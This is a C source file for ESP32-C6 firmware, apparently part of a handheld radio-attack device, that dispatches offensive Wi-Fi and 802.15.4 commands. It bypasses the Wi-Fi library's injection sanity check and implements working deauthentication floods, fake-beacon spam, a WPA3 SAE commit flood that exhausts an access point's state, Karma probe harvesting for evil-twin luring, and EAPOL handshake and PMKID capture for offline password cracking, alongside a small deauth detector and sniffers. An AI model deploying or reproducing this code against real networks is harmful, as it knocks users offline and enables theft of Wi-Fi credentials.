#include "spectra5_offensive.h"

#include <string.h>

#include "esp_attr.h"
#include "esp_ieee802154.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"

static const char *TAG = "spectra5-off";

// --- Injection bypass ---------------------------------------------------------
// libnet80211's ieee80211_raw_frame_sanity_check() rejects deauth/disassoc/raw
// frames. Defining our own (returning 0 = allow) and linking the C6 firmware with
// `-Wl,-zmuldefs` makes ours win over the library's. (Marauder/PORKCHOP method.)
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

// Opcodes: must match domain::CommandOpcode (app/domain/radio/offensive.hpp).
enum {
    CMD_NOP             = 0,
    CMD_GET_CAPS        = 1,
    CMD_SET_MODE        = 2,
    CMD_SET_CHANNEL     = 3,
    CMD_START_MONITOR   = 4,
    CMD_STOP_MONITOR    = 5,
    CMD_SCAN_STATIONS   = 6,
    CMD_START_DEAUTH    = 7,
    CMD_START_BEACON    = 8,
    CMD_START_PROBE     = 9,
    CMD_INJECT_RAW      = 10,
    CMD_STOP            = 11,
    CMD_SAE_FLOOD       = 12,
    CMD_START_KARMA     = 13,
    CMD_START_DETECT    = 14,
    CMD_START_SNIFF     = 15,
    CMD_ZIGBEE_SCAN     = 16,
    CMD_154_SNIFF       = 17,  // 802.15.4 promiscuous frame sniff (param: channel; 0 = stop)
};

// DeauthParams wire layout (offensive_codec::encode_deauth_params):
//   bssid[6] target[6] channel(u8) reason(u16 LE) bursts(u16 LE) = 17 bytes.
#define DEAUTH_PARAMS_LEN 17

static int handle_deauth(const uint8_t *p, uint16_t len)
{
    if (len < DEAUTH_PARAMS_LEN) {
        ESP_LOGW(TAG, "deauth params too short: %u", len);
        return -1;
    }

    const uint8_t *bssid  = p;
    const uint8_t *target = p + 6;
    const uint8_t channel = p[12];
    const uint16_t reason = (uint16_t)(p[13] | (p[14] << 8));
    const uint16_t bursts = (uint16_t)(p[15] | (p[16] << 8));

    int target_is_zero = 1;
    for (int i = 0; i < 6; ++i) {
        if (target[i] != 0) {
            target_is_zero = 0;
            break;
        }
    }

    // Deauth frame (subtype 0xC0): DA / SA=BSSID / BSSID / reason.
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Addr1 (DA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Addr2 (SA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Addr3 (BSSID)
        0x00, 0x00,                          // sequence
        0x07, 0x00,                          // reason (overwritten)
    };
    if (!target_is_zero) {
        memcpy(frame + 4, target, 6);  // unicast to the station
    }                                   // else leave broadcast (whole AP)
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);
    frame[24] = (uint8_t)(reason & 0xFF);
    frame[25] = (uint8_t)((reason >> 8) & 0xFF);

    // If the C6 is running a SoftAP (Evil Twin), inject on the AP interface and DO
    // NOT switch channels -- set_channel + STA-inject while in AP mode resets the C6
    // every frame (that was the Evil-Twin + Deauth crash). Otherwise behave as before.
    wifi_mode_t wmode    = WIFI_MODE_STA;
    esp_wifi_get_mode(&wmode);
    wifi_interface_t iface = WIFI_IF_STA;
    if (wmode == WIFI_MODE_AP) {
        iface = WIFI_IF_AP;  // AP owns the channel; leave it alone
    } else {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }

    const uint16_t rounds = bursts ? bursts : 1;
    int sent = 0;
    for (uint16_t i = 0; i < rounds; ++i) {
        if (esp_wifi_80211_tx(iface, frame, sizeof(frame), false) == ESP_OK) {
            ++sent;
        }
    }
    ESP_LOGI(TAG, "deauth ch=%u bssid=%02x:%02x:%02x:%02x:%02x:%02x %s sent=%d/%d", channel,
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
             target_is_zero ? "(broadcast)" : "(unicast)", sent, rounds);
    return sent;  // frames transmitted (0 = all esp_wifi_80211_tx calls failed)
}

// --- Monitor mode: station (client) discovery via promiscuous capture ---------
// Implemented in app_main.c (where send_to_host_queue lives): pushes a discovered
// station back to the P4 (event_type 0x57: mac[6] bssid[6] rssi).
extern void spectra5_send_station(const uint8_t *mac, const uint8_t *bssid, int8_t rssi);
extern void spectra5_send_probe(const uint8_t *ssid, uint8_t len);
extern void spectra5_send_deauth_alert(const uint8_t *src);
extern void spectra5_send_sniff_stats(const uint32_t *counts5);
extern void spectra5_send_zigbee(const int8_t *powers16);

// Capture: kind 1..4 = EAPOL message M1..M4; pmkid != NULL => 16-byte RSN PMKID
// found in M1. Implemented in app_main.c (sends event 0x58 to the P4).
extern void spectra5_send_capture(uint8_t kind, const uint8_t *ap, const uint8_t *client,
                                  const uint8_t *pmkid);

// Forward the raw 802.11 EAPOL frame to the P4 (event 0x5D) so it can build a
// .pcap of the handshake. Implemented in app_main.c.
extern void spectra5_send_rawframe(const uint8_t *frame, uint16_t len);

// Forward a raw 802.15.4 frame to the P4 (event 0x5E: channel, lqi, rssi, frame).
extern void spectra5_send_154frame(uint8_t channel, uint8_t lqi, int8_t rssi,
                                   const uint8_t *frame, uint16_t len);

#define MAX_SEEN 48
static uint8_t g_target_bssid[6];
static uint8_t g_seen[MAX_SEEN][6];
static int g_seen_count        = 0;
static volatile bool g_monitor = false;
static volatile bool g_karma   = false;  // capture probe-request SSIDs for Karma
static volatile bool g_detect  = false;  // defensive: alert on deauth/disassoc frames
static volatile bool g_sniff   = false;  // live packet-type statistics
static uint32_t g_sniff_counts[5] = {0}; // beacon, probe, data, deauth, other
static uint32_t g_sniff_total     = 0;

static bool mac_eq(const uint8_t *a, const uint8_t *b)
{
    return memcmp(a, b, 6) == 0;
}

static bool already_seen(const uint8_t *m)
{
    for (int i = 0; i < g_seen_count; ++i) {
        if (mac_eq(g_seen[i], m)) {
            return true;
        }
    }
    return false;
}

// Parse a data frame for an EAPOL-Key handshake message; extract the PMKID from
// M1 if present. `client` is the station peer of g_target_bssid.
static void try_eapol(const uint8_t *p, uint16_t len, const uint8_t *client)
{
    const uint8_t fc0 = p[0];
    const uint8_t fc1 = p[1];
    if (((fc0 >> 2) & 0x3) != 0x2) {
        return;  // not a data frame
    }
    if (fc1 & 0x40) {
        return;  // protected/encrypted -> not a cleartext EAPOL handshake
    }
    const int hdr = (((fc0 >> 4) & 0x08) != 0) ? 26 : 24;  // QoS data => +2 bytes
    if (len < (uint16_t)(hdr + 8 + 4 + 3)) {
        return;
    }
    const uint8_t *llc = p + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[6] == 0x88 && llc[7] == 0x8E)) {
        return;  // not LLC/SNAP EAPOL (ethertype 0x888E)
    }
    const uint8_t *eapol = llc + 8;
    if (eapol[1] != 0x03) {
        return;  // not EAPOL-Key
    }
    const uint8_t *key      = eapol + 4;
    const uint16_t key_info = (uint16_t)((key[1] << 8) | key[2]);
    const bool mic          = (key_info & 0x0100) != 0;
    const bool ack          = (key_info & 0x0080) != 0;
    const bool install      = (key_info & 0x0040) != 0;

    uint8_t msg = 0;
    if (ack && !mic) {
        msg = 1;
    } else if (mic && !ack && !install) {
        msg = 2;
    } else if (mic && ack && install) {
        msg = 3;
    } else if (mic && !ack) {
        msg = 4;
    }
    if (msg == 0) {
        return;
    }

    const uint8_t *pmkid = NULL;
    if (msg == 1) {
        const int kd_off = 1 + 2 + 2 + 8 + 32 + 16 + 8 + 8 + 16;  // up to key_data_length
        if (len >= (uint16_t)(hdr + 8 + 4 + kd_off + 2)) {
            const uint8_t *kd      = key + kd_off;
            const uint16_t kdlen   = (uint16_t)((kd[0] << 8) | kd[1]);
            const uint8_t *data    = kd + 2;
            const uint8_t *frm_end = p + len;
            for (int i = 0; (data + i + 22) <= frm_end && i + 22 <= (int)kdlen;) {
                if (data[i] == 0xDD && data[i + 1] >= 0x14 && data[i + 2] == 0x00 &&
                    data[i + 3] == 0x0F && data[i + 4] == 0xAC && data[i + 5] == 0x04) {
                    pmkid = data + i + 6;  // 16-byte PMKID
                    break;
                }
                if (data[i] == 0xDD) {
                    i += 2 + data[i + 1];
                } else {
                    break;
                }
            }
        }
    }
    spectra5_send_capture(msg, g_target_bssid, client, pmkid);
    // Also forward the raw EAPOL frame so the P4 can write a .pcap (small + finite:
    // only the 4 handshake frames, not full-air streaming).
    spectra5_send_rawframe(p, len);
}

static void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_monitor || (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT)) {
        return;
    }
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 24) {
        return;  // too short for a full 802.11 addr field
    }
    const uint8_t *p  = pkt->payload;

    // Live sniffer: classify every frame and report running totals every 50 frames
    // (batched so the SDIO priv link isn't flooded with per-packet events).
    if (g_sniff) {
        const uint8_t fc = p[0];
        if (((fc >> 2) & 0x3) == 2) {
            g_sniff_counts[2]++;  // data
        } else if (((fc >> 2) & 0x3) == 0) {
            if (fc == 0x80) {
                g_sniff_counts[0]++;  // beacon
            } else if (fc == 0x40 || fc == 0x50) {
                g_sniff_counts[1]++;  // probe req/resp
            } else if (fc == 0xC0 || fc == 0xA0) {
                g_sniff_counts[3]++;  // deauth/disassoc
            } else {
                g_sniff_counts[4]++;  // other mgmt
            }
        } else {
            g_sniff_counts[4]++;
        }
        if (++g_sniff_total % 50 == 0) {
            spectra5_send_sniff_stats(g_sniff_counts);
        }
        return;
    }

    // Karma: harvest the SSID a client is probing for (its preferred-network list).
    // Probe Request = management subtype 4 (frame control byte 0 == 0x40). The first
    // tagged element at offset 24 is the SSID (tag 0). Empty = broadcast/wildcard.
    if (g_karma && type == WIFI_PKT_MGMT && p[0] == 0x40 && pkt->rx_ctrl.sig_len >= 26) {
        const uint8_t *ie = p + 24;          // tagged params (no fixed body in probe req)
        if (ie[0] == 0x00) {                 // SSID element
            const uint8_t slen = ie[1];
            if (slen > 0 && slen <= 32 && 24 + 2 + slen <= pkt->rx_ctrl.sig_len) {
                spectra5_send_probe(&ie[2], slen);
            }
        }
        return;  // a probe req is never AP<->STA data traffic
    }

    // Deauth detector (defensive): flag deauth (0xC0) / disassoc (0xA0) frames.
    if (g_detect && type == WIFI_PKT_MGMT && (p[0] == 0xC0 || p[0] == 0xA0)) {
        spectra5_send_deauth_alert(p + 10);  // Addr2 = transmitter
        return;
    }

    const uint8_t *a1 = p + 4;   // Addr1 (RA/DA)
    const uint8_t *a2 = p + 10;  // Addr2 (TA/SA)
    const uint8_t *a3 = p + 16;  // Addr3 (BSSID, usually)

    // Find which address is the station communicating with our target BSSID.
    const uint8_t *sta = NULL;
    if (mac_eq(a1, g_target_bssid)) {
        sta = a2;  // station -> AP
    } else if (mac_eq(a2, g_target_bssid)) {
        sta = a1;  // AP -> station
    } else if (mac_eq(a3, g_target_bssid)) {
        sta = mac_eq(a2, g_target_bssid) ? a1 : a2;
    } else {
        return;  // not our AP
    }
    if (!sta || (sta[0] & 0x01) || mac_eq(sta, g_target_bssid)) {
        return;  // broadcast/multicast or the AP itself
    }
    if (!already_seen(sta)) {
        if (g_seen_count < MAX_SEEN) {
            memcpy(g_seen[g_seen_count++], sta, 6);
        }
        spectra5_send_station(sta, g_target_bssid, pkt->rx_ctrl.rssi);
    }
    if (type == WIFI_PKT_DATA) {
        try_eapol(p, pkt->rx_ctrl.sig_len, sta);  // EAPOL handshake / PMKID capture
    }
}

static int handle_scan_stations(const uint8_t *p, uint16_t len)
{
    if (len < 7) {  // bssid[6] + channel(1)
        return -1;
    }
    memcpy(g_target_bssid, p, 6);
    const uint8_t channel = p[6];
    g_seen_count          = 0;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_cb);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    g_monitor = true;
    const esp_err_t err = esp_wifi_set_promiscuous(true);
    ESP_LOGI(TAG, "scan stations: ch=%u promiscuous=%s", channel, esp_err_to_name(err));
    return err == ESP_OK ? 0 : -1;
}

static int handle_stop_monitor(void)
{
    g_monitor = false;
    g_karma   = false;
    g_detect  = false;
    g_sniff   = false;
    esp_wifi_set_promiscuous(false);
    ESP_LOGI(TAG, "monitor stopped (%d stations seen)", g_seen_count);
    return g_seen_count;
}

// Karma: harvest probe-request SSIDs (preferred networks) on `channel`. The P4
// beacons what we report back so probing clients auto-associate. params = channel(1).
static int handle_start_karma(const uint8_t *p, uint16_t len)
{
    const uint8_t channel = (len >= 1) ? p[0] : 1;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_cb);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    g_monitor = true;
    g_karma   = true;
    const esp_err_t err = esp_wifi_set_promiscuous(true);
    ESP_LOGI(TAG, "karma capture: ch=%u promiscuous=%s", channel, esp_err_to_name(err));
    return err == ESP_OK ? 0 : -1;
}

// Deauth detector (defensive): promiscuous, alert on every deauth/disassoc seen.
static int handle_start_detect(const uint8_t *p, uint16_t len)
{
    (void)p;
    (void)len;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_cb);
    g_monitor = true;
    g_detect  = true;
    const esp_err_t err = esp_wifi_set_promiscuous(true);
    ESP_LOGI(TAG, "deauth detector: promiscuous=%s", esp_err_to_name(err));
    return err == ESP_OK ? 0 : -1;
}

// Live sniffer: promiscuous + per-type frame counters reported to the P4.
static int handle_start_sniff(const uint8_t *p, uint16_t len)
{
    const uint8_t channel = (len >= 1 && p[0] >= 1 && p[0] <= 13) ? p[0] : 0;
    for (int i = 0; i < 5; ++i) {
        g_sniff_counts[i] = 0;
    }
    g_sniff_total = 0;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_cb);
    if (channel) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
    g_monitor = true;
    g_sniff   = true;
    const esp_err_t err = esp_wifi_set_promiscuous(true);
    ESP_LOGI(TAG, "sniffer: ch=%u promiscuous=%s", channel, esp_err_to_name(err));
    return err == ESP_OK ? 0 : -1;
}

// Build one 802.11 beacon frame for `ssid` on `channel`. The BSSID is derived from
// the SSID (FNV-1a) so the fake AP keeps a stable MAC across beacons -- a flickering
// random BSSID makes phones drop/relist it instead of showing a steady entry.
// Returns the frame length.
static int build_beacon(uint8_t *frame, const uint8_t *ssid, uint8_t ssid_len, uint8_t channel)
{
    uint32_t h = 2166136261u;
    for (uint8_t k = 0; k < ssid_len; ++k) {
        h ^= ssid[k];
        h *= 16777619u;
    }
    uint8_t bssid[6];
    bssid[0] = 0x02;  // locally administered, unicast
    bssid[1] = 0x53;  // 'S' (Spectra5 marker)
    bssid[2] = (uint8_t)(h & 0xFF);
    bssid[3] = (uint8_t)((h >> 8) & 0xFF);
    bssid[4] = (uint8_t)((h >> 16) & 0xFF);
    bssid[5] = (uint8_t)((h >> 24) & 0xFF);

    int i = 0;
    frame[i++] = 0x80;  // beacon
    frame[i++] = 0x00;
    frame[i++] = 0x00;  // duration
    frame[i++] = 0x00;
    for (int j = 0; j < 6; ++j) frame[i++] = 0xFF;       // DA broadcast
    for (int j = 0; j < 6; ++j) frame[i++] = bssid[j];   // SA
    for (int j = 0; j < 6; ++j) frame[i++] = bssid[j];   // BSSID
    frame[i++] = 0x00;  // sequence
    frame[i++] = 0x00;
    for (int j = 0; j < 8; ++j) frame[i++] = 0x00;       // timestamp
    frame[i++] = 0x64;  // beacon interval 100
    frame[i++] = 0x00;
    frame[i++] = 0x01;  // capability info (ESS)
    frame[i++] = 0x04;
    frame[i++] = 0x00;  // SSID element
    frame[i++] = ssid_len;
    memcpy(&frame[i], ssid, ssid_len);
    i += ssid_len;
    frame[i++] = 0x01;  // supported rates
    frame[i++] = 0x08;
    frame[i++] = 0x82;
    frame[i++] = 0x84;
    frame[i++] = 0x8b;
    frame[i++] = 0x96;
    frame[i++] = 0x24;
    frame[i++] = 0x30;
    frame[i++] = 0x48;
    frame[i++] = 0x6c;
    frame[i++] = 0x03;  // DS parameter set
    frame[i++] = 0x01;
    frame[i++] = channel;
    return i;
}

// Batch beacon injection (Wi-Fi spam). params = count(1) then count x [ ssid_len(1) ssid[] ].
// params = channel(1) count(1) then count x [ ssid_len(1) ssid[] ]. All SSIDs are
// emitted on `channel` (set once -- the C6 also serves the P4's hosted Wi-Fi over
// SDIO, so heavy per-command channel thrash wedges that link). The P4 rotates the
// channel across 1/6/11 between commands. Karma reuses this for probed SSIDs.
static int handle_beacon(const uint8_t *p, uint16_t len)
{
    if (len < 2) {
        return -1;
    }
    const uint8_t channel = p[0];
    const uint8_t count   = p[1];
    int sent              = 0;
    uint8_t frame[128];

    // With the P4 scanner halted the STA would otherwise enter modem sleep and our
    // injected beacons never hit the air -- keep the radio awake on a fixed channel.
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint16_t pos = 2;
    for (uint8_t n = 0; n < count; ++n) {
        if (pos + 1 > len) {
            break;
        }
        const uint8_t ssid_len = p[pos];
        if (ssid_len > 32 || pos + 1 + ssid_len > len) {
            break;
        }
        const int flen = build_beacon(frame, p + pos + 1, ssid_len, channel);
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false) == ESP_OK) {
            ++sent;
        }
        pos += 1 + ssid_len;
    }
    return sent;
}

// WPA3 SAE Overflow: flood the AP with SAE Commit auth frames from random source
// MACs. The AP allocates SAE state per source -> exhausts its table -> blocks new
// (and re-)connections. params = bssid(6) channel(1). Bursts 16 frames per command.
static int handle_sae_flood(const uint8_t *p, uint16_t len)
{
    if (len < 7) {
        return -1;
    }
    const uint8_t *bssid  = p;
    const uint8_t channel = p[6];
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    int sent = 0;
    uint8_t frame[160];
    // 6 frames/command matches the proven beacon burst; more rapid 128-byte injects
    // back-to-back overrun the C6 TX path and wedge the hosted SDIO link.
    for (int b = 0; b < 6; ++b) {
        uint8_t sa[6];
        esp_fill_random(sa, 6);
        sa[0] = (sa[0] & 0xFE) | 0x02;  // locally administered, unicast

        int i = 0;
        frame[i++] = 0xB0;  // management / authentication
        frame[i++] = 0x00;
        frame[i++] = 0x00;  // duration
        frame[i++] = 0x00;
        for (int j = 0; j < 6; ++j) frame[i++] = bssid[j];  // DA = AP
        for (int j = 0; j < 6; ++j) frame[i++] = sa[j];     // SA = random
        for (int j = 0; j < 6; ++j) frame[i++] = bssid[j];  // BSSID = AP
        frame[i++] = 0x00;  // sequence
        frame[i++] = 0x00;
        frame[i++] = 0x03;  // auth algorithm = 3 (SAE)
        frame[i++] = 0x00;
        frame[i++] = 0x01;  // auth seq = 1 (commit)
        frame[i++] = 0x00;
        frame[i++] = 0x00;  // status = 0
        frame[i++] = 0x00;
        frame[i++] = 0x13;  // finite cyclic group = 19 (ECC P-256)
        frame[i++] = 0x00;
        esp_fill_random(&frame[i], 32);  // scalar
        i += 32;
        esp_fill_random(&frame[i], 64);  // element
        i += 64;
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, i, false) == ESP_OK) {
            ++sent;
        }
    }
    return sent;
}

// --- 802.15.4 (Zigbee/Thread) energy scan -----------------------------------
static volatile int8_t g_ed_power = -128;

// Override the driver's weak energy-detect-done callback (channels reported async).
void esp_ieee802154_energy_detect_done(int8_t power)
{
    g_ed_power = power;
}

/* ------------------ 802.15.4 promiscuous frame sniffer ------------------------
 * The C6 receives raw 802.15.4 frames; the receive-done callback runs in ISR
 * context, so it just copies each frame into a queue and a task forwards them to
 * the P4 (event 0x5E). The P4 parses the MAC header (devices) + writes the .pcap.
 * ACK frames are dropped (tiny, noisy). The FCS is replaced by RSSI/LQI by the
 * driver, so we report those from frame_info and drop the last 2 PSDU bytes. */
typedef struct {
    uint8_t channel;
    uint8_t lqi;
    int8_t  rssi;
    uint8_t len;
    uint8_t data[125];
} ieee154_rx_t;

static volatile bool g_154_sniff = false;
static volatile bool g_154_hop   = false;  // hop channels 11-26 in the task
static QueueHandle_t g_154_q     = NULL;
static TaskHandle_t  g_154_task  = NULL;

// Weak callback overridden: the driver delivers a received frame here in ISR
// context, so it MUST live in IRAM (else it crashes when flash cache is busy).
void IRAM_ATTR esp_ieee802154_receive_done(uint8_t *frame, esp_ieee802154_frame_info_t *frame_info)
{
    if (g_154_sniff && g_154_q != NULL && frame != NULL) {
        uint8_t phr = frame[0];  // PSDU length (incl. the FCS->RSSI/LQI 2 bytes)
        if (phr >= 2 && phr <= 127) {
            ieee154_rx_t f;
            f.channel = frame_info ? frame_info->channel : 0;
            f.lqi     = frame_info ? frame_info->lqi : 0;
            f.rssi    = frame_info ? frame_info->rssi : 0;
            f.len     = (uint8_t)(phr - 2);  // drop the 2 trailing RSSI/LQI bytes
            if (f.len > sizeof(f.data)) {
                f.len = sizeof(f.data);
            }
            memcpy(f.data, frame + 1, f.len);
            BaseType_t hpw = pdFALSE;
            xQueueSendFromISR(g_154_q, &f, &hpw);
            if (hpw) {
                portYIELD_FROM_ISR();
            }
        }
    }
    esp_ieee802154_receive_handle_done(frame);
}

// Persistent task: drains the RX queue, forwards non-ACK frames to the P4
// (THROTTLED so we don't flood/wedge the SDIO link), and hops channels if asked.
static void ieee154_sniff_task(void *arg)
{
    (void)arg;
    ieee154_rx_t f;
    TickType_t last_sent = 0;
    TickType_t last_hop  = 0;
    uint8_t    hop_ch    = 11;
    for (;;) {
        // Channel hopping is done HERE (in task ctx, not via P4 commands) so the
        // SDIO link never sees a retune command mid-capture.
        if (g_154_hop && g_154_sniff) {
            const TickType_t now = xTaskGetTickCount();
            if ((now - last_hop) >= pdMS_TO_TICKS(700)) {
                last_hop = now;
                hop_ch   = (hop_ch >= 26) ? 11 : (uint8_t)(hop_ch + 1);
                esp_ieee802154_set_channel(hop_ch);
                esp_ieee802154_receive();  // re-arm RX so the new channel takes effect
            }
        }
        if (xQueueReceive(g_154_q, &f, pdMS_TO_TICKS(100)) != pdTRUE) {
            continue;
        }
        if (!g_154_sniff || f.len < 1) {
            continue;
        }
        const uint8_t ftype = f.data[0] & 0x07;  // FCF frame type
        if (ftype == 0x02) {
            continue;  // ACK -- skip
        }
        const TickType_t now = xTaskGetTickCount();
        if ((now - last_sent) < pdMS_TO_TICKS(180)) {
            continue;  // throttle: <=~5 frames/s keeps the priv link healthy
        }
        last_sent = now;
        spectra5_send_154frame(f.channel, f.lqi, f.rssi, f.data, f.len);
    }
}

// Start/stop/retune the 802.15.4 sniffer. param[0]: 11-26 = channel, 0xFF = hop
// all channels, anything else = stop. Idempotent (safe to re-call while running).
static int handle_154_sniff(const uint8_t *p, uint16_t len)
{
    const uint8_t channel = (len >= 1) ? p[0] : 0;
    const bool    hop     = (channel == 0xFF);
    if (!hop && (channel < 11 || channel > 26)) {  // stop
        if (g_154_sniff) {
            g_154_sniff = false;
            g_154_hop   = false;
            esp_ieee802154_disable();
        }
        return 0;
    }
    g_154_hop = hop;
    if (g_154_sniff) {            // already running -> just retune (no re-enable)
        if (!hop) {
            esp_ieee802154_set_channel(channel);
            esp_ieee802154_receive();  // apply the new channel
        }
        return 0;
    }
    if (g_154_q == NULL) {
        g_154_q = xQueueCreate(16, sizeof(ieee154_rx_t));
    }
    if (g_154_task == NULL && g_154_q != NULL) {
        xTaskCreate(ieee154_sniff_task, "154sniff", 4096, NULL, 5, &g_154_task);
    }
    if (esp_ieee802154_enable() != ESP_OK) {
        return -1;
    }
    esp_ieee802154_set_channel(hop ? 11 : channel);
    esp_ieee802154_set_promiscuous(true);
    esp_ieee802154_set_rx_when_idle(true);
    g_154_sniff = true;
    esp_ieee802154_receive();
    ESP_LOGI(TAG, "802.15.4 sniff %s", hop ? "hopping 11-26" : "fixed channel");
    return 0;
}

// Energy scan across the 16 802.15.4 channels (11-26): per-channel peak RSSI.
// Shows where Zigbee/Thread/Matter traffic lives. params: none. Reports 16 bytes.
static int handle_zigbee_scan(const uint8_t *p, uint16_t len)
{
    (void)p;
    (void)len;
    if (esp_ieee802154_enable() != ESP_OK) {
        ESP_LOGE(TAG, "ieee802154 enable failed");
        return -1;
    }
    int8_t powers[16];
    for (int ch = 11; ch <= 26; ++ch) {
        esp_ieee802154_set_channel((uint8_t)ch);
        g_ed_power = -128;
        if (esp_ieee802154_energy_detect(4000) == ESP_OK) {  // ~4 ms ED window
            vTaskDelay(pdMS_TO_TICKS(20));                    // let the callback fire
        }
        powers[ch - 11] = g_ed_power;
    }
    esp_ieee802154_disable();
    spectra5_send_zigbee(powers);
    ESP_LOGI(TAG, "zigbee energy scan done (ch 11-26)");
    return 16;
}

int spectra5_offensive_dispatch(const uint8_t *data, uint16_t len)
{
    if (!data || len < 1) {
        return -1;
    }
    const uint8_t opcode  = data[0];
    const uint8_t *params = data + 1;
    const uint16_t plen   = (uint16_t)(len - 1);

    switch (opcode) {
        case CMD_START_DEAUTH:
            return handle_deauth(params, plen);
        case CMD_SCAN_STATIONS:
            return handle_scan_stations(params, plen);
        case CMD_START_BEACON:
            return handle_beacon(params, plen);
        case CMD_SAE_FLOOD:
            return handle_sae_flood(params, plen);
        case CMD_START_KARMA:
            return handle_start_karma(params, plen);
        case CMD_START_DETECT:
            return handle_start_detect(params, plen);
        case CMD_START_SNIFF:
            return handle_start_sniff(params, plen);
        case CMD_ZIGBEE_SCAN:
            return handle_zigbee_scan(params, plen);
        case CMD_154_SNIFF:
            return handle_154_sniff(params, plen);
        case CMD_STOP_MONITOR:
        case CMD_STOP:
            return handle_stop_monitor();
        case CMD_SET_CHANNEL:
            if (plen >= 1) {
                esp_wifi_set_channel(params[0], WIFI_SECOND_CHAN_NONE);
                return 0;
            }
            return -1;
        default:
            ESP_LOGW(TAG, "unhandled opcode %u", opcode);
            return -1;
    }
}
